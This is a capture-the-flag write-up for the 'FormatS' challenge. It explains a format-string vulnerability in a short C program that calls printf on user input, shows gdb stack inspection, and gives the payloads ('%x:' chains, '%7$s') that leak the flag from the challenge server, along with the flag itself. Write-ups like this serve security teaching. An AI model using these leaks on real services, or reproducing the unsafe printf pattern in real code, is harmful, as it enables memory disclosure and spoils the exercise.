# FormatS

### Points: 300
---

**Description:**
```txt
The flag's located somewhere in the binary. Can you find it?[

nc cyberyoddha.baycyber.net 10005

- Haskell#1426
```

---

In this challenge we are given two files, a binary and its source code.

Taking a look at the source code, we can see that it is very simple. It reads input from stdin
and prints it back to you. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main ()
{
	char *input;
	char *flag = "REDACTED!";

	gets(input);
	printf(input);

	return 0;
 
}
```

The fatal flaw in this however, is that the **printf(input)** doesn't have any format specifiers leaving this program vulnerable potentially allowing us to see what is in the flag.

Lets run the program using gdb, check the disassembly of the main function and set up a breakpoint at the address of the gets() call.

```bash
$ gdb ./formats
```

Disassemble main
```bash
gef➤  disassemble main
Dump of assembler code for function main:
   0x08049172 <+0>:	lea    ecx,[esp+0x4]
   0x08049176 <+4>:	and    esp,0xfffffff0
   0x08049179 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804917c <+10>:	push   ebp
   0x0804917d <+11>:	mov    ebp,esp
   0x0804917f <+13>:	push   ebx
   0x08049180 <+14>:	push   ecx
   0x08049181 <+15>:	sub    esp,0x10
   0x08049184 <+18>:	call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x08049189 <+23>:	add    ebx,0x2e77
   0x0804918f <+29>:	lea    eax,[ebx-0x1ff8]
   0x08049195 <+35>:	mov    DWORD PTR [ebp-0xc],eax
   0x08049198 <+38>:	sub    esp,0xc
   0x0804919b <+41>:	push   DWORD PTR [ebp-0x10]
   0x0804919e <+44>:	call   0x8049040 <gets@plt>
   0x080491a3 <+49>:	add    esp,0x10
   0x080491a6 <+52>:	sub    esp,0xc
   0x080491a9 <+55>:	push   DWORD PTR [ebp-0x10]
   0x080491ac <+58>:	call   0x8049030 <printf@plt>
   0x080491b1 <+63>:	add    esp,0x10
   0x080491b4 <+66>:	mov    eax,0x0
   0x080491b9 <+71>:	lea    esp,[ebp-0x8]
   0x080491bc <+74>:	pop    ecx
   0x080491bd <+75>:	pop    ebx
   0x080491be <+76>:	pop    ebp
   0x080491bf <+77>:	lea    esp,[ecx-0x4]
   0x080491c2 <+80>:	ret    
End of assembler dump.
```

Set Breakpoint
```bash
gef➤  break *0x0804919e
Breakpoint 1 at 0x80491ac: file formats.c, line 11.
```

Run program
```bash
gef➤  run
```

At this point, the program will start running and hit the breakpoint right before a user can input anything.


If we examine the stack we can see the address of the flag
```bash
──────────────────────────────────────────────────────────────────────── stack ────
0xffffd960│+0x0000: 0xffffda4c  →  0xffffdc01  →  "SHELL=/bin/bash"	 ← $esp
0xffffd964│+0x0004: 0xffffffff
0xffffd968│+0x0008: 0x01010101
0xffffd96c│+0x000c: 0x08049189  →  <main+23> add ebx, 0x2e77
0xffffd970│+0x0010: 0x00000001
0xffffd974│+0x0014: 0xffffda44  →  0xffffdbaa  →  "..."
0xffffd978│+0x0018: 0xffffda4c  →  0xffffdc01  →  "SHELL=/bin/bash"
0xffffd97c│+0x001c: 0x0804a008  →  "REDACTED!"
```
Which is 0x0804a008 and points to the string: "REDACTED!"

--- 

Now that we have that valuable information, we can use the format string vulnerability to leak information from the stack. 

If we run the program normally, and input a format string specifier, such as, **%x** to print hex values, we can see information that would not be shown otherwise. 

Lets run the program and enter **%x:** muliple times to see if we can find the address that holds the flag.
```bash
$ ./formats 
%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:
```
```bash
ffffffff:1010101:8049189:1:fffec6a4:fffec6ac:804a008:fffec600:0:0:
```
From the output, we can see that the 7th address leaked is the address of the flag

If we run the program again and use **%7$s**, we can see the actual value of that address 
```bash
$ ./formats 
%7$s
```
```bash
REDACTED!
```

---

Now just run this on the actual challenge to get the flag!

```bash
$ nc cyberyoddha.baycyber.net 10005
%7$s
```
```bash
cyctf{3xpl0!t_th3_f0rm@t_str!ng}
```